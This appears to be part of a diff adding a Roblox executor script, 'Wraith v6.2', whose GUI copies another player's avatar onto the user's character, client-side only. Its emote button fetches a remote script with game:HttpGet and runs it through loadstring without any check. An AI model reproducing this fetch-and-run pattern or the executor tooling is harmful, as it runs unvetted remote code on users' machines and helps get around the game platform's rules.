+  Name = "UsernameBox", Position = UDim2.new(0, 12, 0, 0), Size = UDim2.new(1, -24, 1, 0), BackgroundTransparency = 1,
+  ClearTextOnFocus = false, PlaceholderText = "Username or user ID", PlaceholderColor3 = THEME.sub, Text = "",
+  TextColor3 = THEME.text, Font = Enum.Font.GothamMedium, TextSize = 15, TextXAlignment = Enum.TextXAlignment.Left, Parent = inputField,
+})
+local previewBtn = makeButton(inputRow, "Preview", UDim2.new(0, 80, 1, 0), UDim2.new(1, -80, 0, 0), THEME.accent2, THEME.accent)
+previewBtn.TextSize = 14
+
+local card = new("Frame", { Name = "PreviewCard", LayoutOrder = 2, Size = UDim2.new(1, 0, 0, 150), BackgroundColor3 = THEME.panel, BorderSizePixel = 0, Parent = body })
+corner(card, 14)
+stroke(card, THEME.stroke, 1, 0.4)
+local thumbHolder = new("Frame", { Position = UDim2.new(0, 12, 0, 15), Size = UDim2.fromOffset(120, 120), BackgroundColor3 = THEME.field, BorderSizePixel = 0, Parent = card })
+corner(thumbHolder, 12)
+local previewImage = new("ImageLabel", { Name = "PreviewImage", BackgroundTransparency = 1, Size = UDim2.new(1, 0, 1, 0), ScaleType = Enum.ScaleType.Fit, Image = "", Parent = thumbHolder })
+local previewTag = label(card, { Position = UDim2.new(0, 146, 0, 22), Size = UDim2.new(1, -158, 0, 14), Font = Enum.Font.GothamBold, TextSize = 11, TextColor3 = THEME.info, Text = "YOU" })
+local previewDisplay = label(card, { Position = UDim2.new(0, 146, 0, 40), Size = UDim2.new(1, -158, 0, 26), Font = Enum.Font.GothamBold, TextSize = 20, TextTruncate = Enum.TextTruncate.AtEnd, Text = "" })
+local previewUser = label(card, { Position = UDim2.new(0, 146, 0, 70), Size = UDim2.new(1, -158, 0, 18), TextSize = 14, TextColor3 = THEME.sub, TextTruncate = Enum.TextTruncate.AtEnd, Text = "" })
+local previewId = label(card, { Position = UDim2.new(0, 146, 0, 90), Size = UDim2.new(1, -158, 0, 16), TextSize = 12, TextColor3 = THEME.sub, Text = "" })
+
+local function showPreview(user, tag)
+  previewImage.Image = thumbFor(user.id)
+  previewTag.Text = tag or "PREVIEW"
+  previewDisplay.Text = user.display
+  previewUser.Text = "@" .. user.name
+  previewId.Text = "ID " .. tostring(user.id)
+end
+
+local buttonRow = new("Frame", { Name = "Buttons", LayoutOrder = 3, Size = UDim2.new(1, 0, 0, 50), BackgroundTransparency = 1, Parent = body })
+local applyBtn = makeButton(buttonRow, "Apply", UDim2.new(0.6, -5, 1, 0), UDim2.new(0, 0, 0, 0), THEME.accent, THEME.accent2)
+local removeBtn = makeButton(buttonRow, "Remove", UDim2.new(0.4, -5, 1, 0), UDim2.new(0.6, 5, 0, 0), THEME.danger, THEME.danger2)
+
+local overlayRow = new("Frame", { Name = "Overlays", LayoutOrder = 4, Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1, Parent = body })
+local function makeChip(text, position)
+  local b = new("TextButton", {
+    Size = UDim2.new(0.5, -5, 1, 0), Position = position, BackgroundColor3 = THEME.field, BorderSizePixel = 0,
+    AutoButtonColor = false, Text = text, Font = Enum.Font.GothamBold, TextSize = 15, TextColor3 = THEME.text, Parent = overlayRow,
+  })
+  corner(b, 12)
+  stroke(b, THEME.stroke, 1, 0.4)
+  return b
+end
+local korbloxBtn = makeChip("Korblox", UDim2.new(0, 0, 0, 0))
+local headlessBtn = makeChip("Headless", UDim2.new(0.5, 5, 0, 0))
+
+-- loads the emote hub (animations and emotes)
+local emoteRow = new("Frame", { Name = "EmoteRow", LayoutOrder = 5, Size = UDim2.new(1, 0, 0, 46), BackgroundTransparency = 1, Parent = body })
+local emoteBtn = makeButton(emoteRow, "Animations & Emotes", UDim2.new(1, 0, 1, 0), UDim2.new(0, 0, 0, 0), THEME.accent2, THEME.accent)
+emoteBtn.TextSize = 15
+
+local statusCard = new("Frame", {
+  Name = "StatusCard", LayoutOrder = 6, Size = UDim2.new(1, 0, 0, 44), AutomaticSize = Enum.AutomaticSize.Y,
+  BackgroundColor3 = THEME.panel, BorderSizePixel = 0, Parent = body,
+})
+corner(statusCard, 12)
+stroke(statusCard, THEME.stroke, 1, 0.4)
+local statusDot = new("Frame", { Position = UDim2.new(0, 14, 0, 17), Size = UDim2.fromOffset(10, 10), BackgroundColor3 = THEME.info, BorderSizePixel = 0, Parent = statusCard })
+corner(statusDot, 5)
+local statusLabel = label(statusCard, {
+  Name = "Status", Position = UDim2.new(0, 34, 0, 0), Size = UDim2.new(1, -46, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
+  TextSize = 13, TextWrapped = true, TextColor3 = THEME.text, Text = "Wraith v6.2 loaded. Type a name (or tap a player below) and press Enter to preview.",
+})
+padding(statusLabel, 13, 0, 13, 0)
+
+local function setStatus(text, kind)
+  statusLabel.Text = text
+  statusDot.BackgroundColor3 = THEME[kind or "info"] or THEME.info
+end
+
+local function setBusy(state)
+  busy = state
+  applyBtn.Text = state and "Working..." or "Apply"
+end
+
+local optionsCard = new("Frame", {
+  Name = "Options", LayoutOrder = 7, Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
+  BackgroundColor3 = THEME.panel, BorderSizePixel = 0, Parent = body,
+})
+corner(optionsCard, 14)
+stroke(optionsCard, THEME.stroke, 1, 0.4)
+padding(optionsCard, 10, 14, 6, 14)
+new("UIListLayout", { Padding = UDim.new(0, 2), SortOrder = Enum.SortOrder.LayoutOrder, Parent = optionsCard })
+label(optionsCard, { LayoutOrder = 0, Size = UDim2.new(1, 0, 0, 22), Font = Enum.Font.GothamBold, TextSize = 11, TextColor3 = THEME.info, Text = "OPTIONS" })
+
+local function makeToggle(order, title, hint, key)
+  local row = new("Frame", { LayoutOrder = order, Size = UDim2.new(1, 0, 0, 48), BackgroundTransparency = 1, Parent = optionsCard })
+  label(row, { Position = UDim2.new(0, 0, 0, 6), Size = UDim2.new(1, -60, 0, 18), Font = Enum.Font.GothamMedium, Text = title })
+  label(row, { Position = UDim2.new(0, 0, 0, 25), Size = UDim2.new(1, -60, 0, 16), TextSize = 11, TextColor3 = THEME.sub, Text = hint })
+  local track = new("Frame", {
+    AnchorPoint = Vector2.new(1, 0.5), Position = UDim2.new(1, 0, 0.5, 0), Size = UDim2.fromOffset(46, 26),
+    BackgroundColor3 = THEME.off, BorderSizePixel = 0, Parent = row,
+  })
+  corner(track, 13)
+  local knob = new("Frame", {
+    AnchorPoint = Vector2.new(0, 0.5), Position = UDim2.new(0, 3, 0.5, 0), Size = UDim2.fromOffset(20, 20),
+    BackgroundColor3 = Color3.new(1, 1, 1), BorderSizePixel = 0, Parent = track,
+  })
+  corner(knob, 10)
+  local function render(animate)
+    local on = options[key]
+    local trackColor = on and THEME.accent or THEME.off
+    local knobPos = on and UDim2.new(1, -23, 0.5, 0) or UDim2.new(0, 3, 0.5, 0)
+    if animate then
+      tween(track, { BackgroundColor3 = trackColor })
+      tween(knob, { Position = knobPos })
+    else
+      track.BackgroundColor3 = trackColor
+      knob.Position = knobPos
+    end
+  end
+  render(false)
+  local hit = new("TextButton", { Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1, Text = "", Parent = row })
+  table.insert(connections, hit.MouseButton1Click:Connect(function()
+    options[key] = not options[key]
+    render(true)
+  end))
+end
+
+makeToggle(1, "Body parts and proportions", "Copies their full body onto yours", "body")
+makeToggle(2, "Animations", "Their animation pack", "animations")
+makeToggle(3, "Clothing and colors", "Shirt, pants, graphic, body colors", "clothes")
+makeToggle(4, "Hats and accessories", "Hair, hats, layered clothing", "accessories")
+makeToggle(5, "Keep after respawn", "Re-applies the look when you respawn", "keep")
+
+local playersCard = new("Frame", {
+  Name = "Players", LayoutOrder = 8, Size = UDim2.new(1, 0, 0, 0), AutomaticSize = Enum.AutomaticSize.Y,
+  BackgroundColor3 = THEME.panel, BorderSizePixel = 0, Parent = body,
+})
+corner(playersCard, 14)
+stroke(playersCard, THEME.stroke, 1, 0.4)
+padding(playersCard, 10, 10, 10, 10)
+new("UIListLayout", { Padding = UDim.new(0, 4), SortOrder = Enum.SortOrder.LayoutOrder, Parent = playersCard })
+label(playersCard, { LayoutOrder = 0, Size = UDim2.new(1, 0, 0, 20), Font = Enum.Font.GothamBold, TextSize = 11, TextColor3 = THEME.info, Text = "PLAYERS IN SERVER - TAP TO PICK" })
+
+label(body, {
+  Name = "Footer", LayoutOrder = 9, Size = UDim2.new(1, 0, 0, 30), TextSize = 11, TextColor3 = THEME.sub,
+  TextWrapped = true, TextXAlignment = Enum.TextXAlignment.Center,
+  Text = "Local only. Other players still see your real avatar. Tap the G circle (or RightShift) to open and close this window.",
+})
+
+showPreview({ id = LocalPlayer.UserId, name = LocalPlayer.Name, display = LocalPlayer.DisplayName }, "YOU")
+
+local minimized = false
+local function layoutMain()
+  local camera = workspace.CurrentCamera
+  local viewport = camera and camera.ViewportSize or Vector2.new(800, 600)
+  local w, h
+  if IS_MOBILE then
+    w = math.clamp(viewport.X * 0.55, BASE_W, 520)
+    h = math.max(viewport.Y - 16, 300)
+  else
+    w = math.clamp(viewport.X - 20, 260, BASE_W)
+    h = math.clamp(viewport.Y - 20, 300, BASE_H)
+  end
+  if minimized then h = TITLE_H + 4 end
+  main.Size = UDim2.fromOffset(w, h)
+end
+layoutMain()
+
+do
+  local camera = workspace.CurrentCamera
+  if camera then table.insert(connections, camera:GetPropertyChangedSignal("ViewportSize"):Connect(layoutMain)) end
+end
+
+table.insert(connections, minBtn.MouseButton1Click:Connect(function()
+  minimized = not minimized
+  body.Visible = not minimized
+  minBtn.Text = minimized and "+" or "-"
+  layoutMain()
+end))
+
+local TOGGLE_SIZE = IS_MOBILE and 52 or 46
+local DRAG_THRESHOLD = 6
+local toggleBtn = new("TextButton", {
+  Name = "WraithToggle", Position = UDim2.fromOffset(14, 110), Size = UDim2.fromOffset(TOGGLE_SIZE, TOGGLE_SIZE),
+  BackgroundColor3 = THEME.bg, BorderSizePixel = 0, AutoButtonColor = false, Text = "G", Font = Enum.Font.GothamBold,
+  TextSize = 24, TextColor3 = THEME.accent, ZIndex = 50, Parent = screenGui,
+})
+corner(toggleBtn, TOGGLE_SIZE / 2)
+stroke(toggleBtn, THEME.outline, 2)
+
+local function setWindowVisible(state)
+  main.Visible = state
+  toggleBtn.TextColor3 = state and THEME.accent or THEME.text
+end
+
+local function screenSize()
+  local size = screenGui.AbsoluteSize
+  if size.X > 0 and size.Y > 0 then return size end
+  local camera = workspace.CurrentCamera
+  return camera and camera.ViewportSize or Vector2.new(800, 600)
+end
+
+local function clampToggle(x, y)
+  local size = screenSize()
+  return math.clamp(x, 0, math.max(size.X - TOGGLE_SIZE, 0)), math.clamp(y, 0, math.max(size.Y - TOGGLE_SIZE, 0))
+end
+
+do
+  local pressing, moved = false, false
+  local pressInput, pressPos, startX, startY
+  table.insert(connections, toggleBtn.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+      pressing, moved = true, false
+      pressInput = input
+      pressPos = input.Position
+      startX, startY = toggleBtn.Position.X.Offset, toggleBtn.Position.Y.Offset
+      tween(toggleBtn, { BackgroundColor3 = THEME.field }, 0.08)
+    end
+  end))
+  table.insert(connections, UserInputService.InputChanged:Connect(function(input)
+    if not pressing then return end
+    local isMouse = input.UserInputType == Enum.UserInputType.MouseMovement
+    local isTouch = input.UserInputType == Enum.UserInputType.Touch and input == pressInput
+    if not (isMouse or isTouch) then return end
+    local dx, dy = input.Position.X - pressPos.X, input.Position.Y - pressPos.Y
+    if not moved and Vector2.new(dx, dy).Magnitude > DRAG_THRESHOLD then moved = true end
+    if moved then
+      local x, y = clampToggle(startX + dx, startY + dy)
+      toggleBtn.Position = UDim2.fromOffset(x, y)
+    end
+  end))
+  table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+    if not pressing then return end
+    local isMouse = input.UserInputType == Enum.UserInputType.MouseButton1
+    local isTouch = input.UserInputType == Enum.UserInputType.Touch and input == pressInput
+    if not (isMouse or isTouch) then return end
+    pressing = false
+    tween(toggleBtn, { BackgroundColor3 = THEME.bg }, 0.12)
+    if not moved then setWindowVisible(not main.Visible) end
+  end))
+end
+
+table.insert(connections, screenGui:GetPropertyChangedSignal("AbsoluteSize"):Connect(function()
+  local x, y = clampToggle(toggleBtn.Position.X.Offset, toggleBtn.Position.Y.Offset)
+  toggleBtn.Position = UDim2.fromOffset(x, y)
+end))
+table.insert(connections, closeBtn.MouseButton1Click:Connect(function() setWindowVisible(false) end))
+setWindowVisible(true)
+
+local function runPreview()
+  local text = trim(usernameBox.Text)
+  if text == "" then return end
+  task.spawn(function()
+    setStatus("Looking up " .. text .. "...", "info")
+    local user, err = lookupUser(text)
+    if not user then
+      setStatus(err, "err")
+      return
+    end
+    showPreview(user, "PREVIEW")
+    setStatus("Preview ready. Press Apply to wear it.", "ok")
+  end)
+end
+
+local function runApply()
+  if busy then return end
+  local text = trim(usernameBox.Text)
+  if text == "" then
+    setStatus("Type a username or user ID first.", "err")
+    return
+  end
+  setBusy(true)
+  task.spawn(function()
+    local ok, msg = runSafely(function()
+      setStatus("Looking up " .. text .. "...", "info")
+      local user, err = lookupUser(text)
+      if not user then return false, err end
+      showPreview(user, "PREVIEW")
+      setStatus("Downloading avatar...", "info")
+      local desc = getDescription(user)
+      if not desc then return false, "Couldn't load " .. user.name .. "'s avatar." end
+      setStatus("Applying look...", "info")
+      local applied, note = applyLook(user, desc, readOptions())
+      if not applied then
+        lastDesc, lastUser = nil, nil
+        return false, note
+      end
+      lastDesc, lastUser = desc, user
+      showPreview(user, "WEARING")
+      local extra = (note and note ~= "") and (" " .. note) or ""
+      return true, ("Wearing %s (@%s). Press Remove to undo.%s"):format(user.display, user.name, extra)
+    end)
+    setBusy(false)
+    setStatus(msg or (ok and "Done." or "Apply failed."), ok and "ok" or "err")
+  end)
+end
+
+local function runRemove()
+  if busy then return end
+  setBusy(true)
+  setStatus("Restoring your original look...", "info")
+  task.spawn(function()
+    local ok, msg = runSafely(restoreOriginal)
+    setBusy(false)
+    if ok then
+      lastDesc, lastUser = nil, nil
+      showPreview({ id = LocalPlayer.UserId, name = LocalPlayer.Name, display = LocalPlayer.DisplayName }, "YOU")
+      setStatus(msg or "Back to your original look.", "ok")
+    else
+      setStatus(msg or "Remove failed.", "err")
+    end
+  end)
+end
+
+-- Animations & Emotes: loads the emote hub, then hides this window so the hub is visible
+local emotesBusy = false
+local function runEmotes()
+  if emotesBusy then return end
+  emotesBusy = true
+  setStatus("Loading emotes...", "info")
+  task.spawn(function()
+    local ok, err = pcall(function()
+      if typeof(loadstring) ~= "function" then error("this executor has no loadstring") end
+      local source = game:HttpGet(EMOTES_URL)
+      local fn, compileErr = loadstring(source)
+      if not fn then error(compileErr or "the emote script didn't compile") end
+      fn()
+    end)
+    emotesBusy = false
+    if ok then
+      setStatus("Emotes loaded. Tap the G circle to come back to this window.", "ok")
+      setWindowVisible(false)
+    else
+      setStatus("Couldn't load emotes: " .. tostring(err), "err")
+    end
+  end)
+end
+
+local function renderChip(btn, on)
+  tween(btn, { BackgroundColor3 = on and THEME.accent or THEME.field }, 0.12)
+  btn.TextColor3 = on and Color3.new(1, 1, 1) or THEME.text
+end
+
+local function toggleOverlay(key, btn, title)
+  if busy then setStatus("Wait for the current change to finish, then tap again.", "err"); return end
+  local char, hum = getCharacter()
+  if not char or hum.Health <= 0 then
+    setStatus("Your character isn't ready. Wait for it to spawn, then tap again.", "err"); return
+  end
+
+  overlay[key] = not overlay[key]
+  renderChip(btn, overlay[key])
+  if key == "korblox" and overlay.korblox then setStatus("Building Korblox...", "info") end
+
+  local ok
+  if key == "headless" then ok = setHeadless(char, overlay.headless)
+  else ok = setKorbloxMesh(char, overlay.korblox) end
+
+  if not ok then
+    overlay[key] = false
+    renderChip(btn, false)
+    setStatus(title .. " couldn't apply properly. Missing body parts.", "err")
+  else
+    setStatus(title .. (overlay[key] and " on." or " off."), "ok")
+  end
+end
+
+table.insert(connections, korbloxBtn.MouseButton1Click:Connect(function() toggleOverlay("korblox", korbloxBtn, "Korblox") end))
+table.insert(connections, headlessBtn.MouseButton1Click:Connect(function() toggleOverlay("headless", headlessBtn, "Headless") end))
+table.insert(connections, emoteBtn.MouseButton1Click:Connect(runEmotes))
+table.insert(connections, applyBtn.MouseButton1Click:Connect(runApply))
+table.insert(connections, removeBtn.MouseButton1Click:Connect(runRemove))
+table.insert(connections, previewBtn.MouseButton1Click:Connect(runPreview))
+
+local playerRows = {}
+local function refreshPlayers()
+  for _, r in ipairs(playerRows) do r:Destroy() end
+  playerRows = {}
+  local list = Players:GetPlayers()
+  table.sort(list, function(a, b) return a.Name:lower() < b.Name:lower() end)
+  local order = 1
+  for _, plr in ipairs(list) do
+    if plr ~= LocalPlayer and order <= 25 then
+      local row = new("TextButton", {
+        LayoutOrder = order, Size = UDim2.new(1, 0, 0, 40), BackgroundColor3 = THEME.field,
+        BorderSizePixel = 0, AutoButtonColor = true, Text = "", Parent = playersCard,
+      })
+      corner(row, 10)
+      corner(new("ImageLabel", {
+        Position = UDim2.new(0, 6, 0.5, -14), Size = UDim2.fromOffset(28, 28), BackgroundColor3 = THEME.bg,
+        BorderSizePixel = 0, Image = ("rbxthumb://type=AvatarHeadShot&id=%d&w=48&h=48"):format(plr.UserId), Parent = row,
+      }), 14)
+      label(row, { Position = UDim2.new(0, 42, 0, 3), Size = UDim2.new(1, -50, 0, 18), Font = Enum.Font.GothamMedium, TextSize = 13, TextTruncate = Enum.TextTruncate.AtEnd, Text = plr.DisplayName })
+      label(row, { Position = UDim2.new(0, 42, 0, 21), Size = UDim2.new(1, -50, 0, 14), TextSize = 11, TextColor3 = THEME.sub, TextTruncate = Enum.TextTruncate.AtEnd, Text = "@" .. plr.Name })
+      row.MouseButton1Click:Connect(function()
+        usernameBox.Text = plr.Name
+        runPreview()
+      end)
+      table.insert(playerRows, row)
+      order = order + 1
+    end
+  end
+  if order == 1 then
+    table.insert(playerRows, label(playersCard, { LayoutOrder = 1, Size = UDim2.new(1, 0, 0, 28), TextSize = 12, TextColor3 = THEME.sub, Text = "No other players in this server." }))
+  end
+end
+
+local function waitUntilReady(char)
+  local hum = char:WaitForChild("Humanoid", 10)
+  if not hum then return nil end
+  local startedAt = os.clock()
+  while os.clock() - startedAt < 10 do
+    local ok, loaded = pcall(function() return LocalPlayer:HasAppearanceLoaded() end)
+    if not ok or loaded then break end
+    task.wait(0.2)
+  end
+  task.wait(0.5)
+  return hum
+end
+
+local function overlaysWhenReady(char)
+  if not waitUntilReady(char) then return end
+  while busy do task.wait(0.1) end
+  if LocalPlayer.Character ~= char then return end
+  if overlay.korblox or overlay.headless then
+    pcall(refreshOverlays, char)
+  end
+end
+
+refreshPlayers()
+table.insert(connections, Players.PlayerAdded:Connect(function() task.defer(refreshPlayers) end))
+table.insert(connections, Players.PlayerRemoving:Connect(function() task.defer(refreshPlayers) end))
+table.insert(connections, usernameBox.Focused:Connect(function() tween(inputStroke, { Color = THEME.outline }) end))
+table.insert(connections, usernameBox.FocusLost:Connect(function(enterPressed)
+  tween(inputStroke, { Color = THEME.stroke })
+  if enterPressed then runPreview() end
+end))
+
+table.insert(connections, LocalPlayer.CharacterRemoving:Connect(function()
+  if os.clock() < watchUntil then log(stamp(), "character removed (respawn or reset)") end
+end))
+
+table.insert(connections, LocalPlayer.CharacterAdded:Connect(function(char)
+  if keepPaused then
+    keepPaused = false
+    lastDesc, lastUser = nil, nil
+    if options.keep then
+      setStatus("You died while this look was on, so keep is paused. Press Apply to try again.", "err")
+    end
+    task.spawn(overlaysWhenReady, char)
+    return
+  end
+  if not (options.keep and lastDesc and lastUser) then
+    task.spawn(overlaysWhenReady, char)
+    return
+  end
+  task.spawn(function()
+    if not waitUntilReady(char) then return end
+    while busy do task.wait(0.1) end
+    if LocalPlayer.Character ~= char or not lastDesc or not lastUser then return end
+    setBusy(true)
+    local ok, msg = runSafely(applyLook, lastUser, lastDesc, readOptions())
+    setBusy(false)
+    if ok then
+      setStatus("Re-applied " .. lastUser.display .. " after respawn.", "ok")
+    else
+      setStatus(msg or "Couldn't re-apply after respawn.", "err")
+    end
+  end)
+end))
+
+local dragging, dragStart, startPos = false, nil, nil
+table.insert(connections, titleBar.InputBegan:Connect(function(input)
+  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+    dragging = true
+    dragStart = input.Position
+    startPos = main.Position
+  end
+end))
+table.insert(connections, UserInputService.InputEnded:Connect(function(input)
+  if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then dragging = false end
+end))
+table.insert(connections, UserInputService.InputChanged:Connect(function(input)
+  if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+    local delta = input.Position - dragStart
+    main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+  end
+end))
+
+table.insert(connections, UserInputService.InputBegan:Connect(function(input, processed)
+  if processed then return end
+  if input.KeyCode == TOGGLE_KEY then setWindowVisible(not main.Visible) end
+end))
+
+local function destroyHub()
+  for _, c in ipairs(connections) do pcall(function() c:Disconnect() end) end
+  connections = {}
+  if screenGui then screenGui:Destroy() end
+end
+
+env.GlitchedWraithCleanup = destroyHub
+env.GlitchedWraithRestore = restoreOriginal
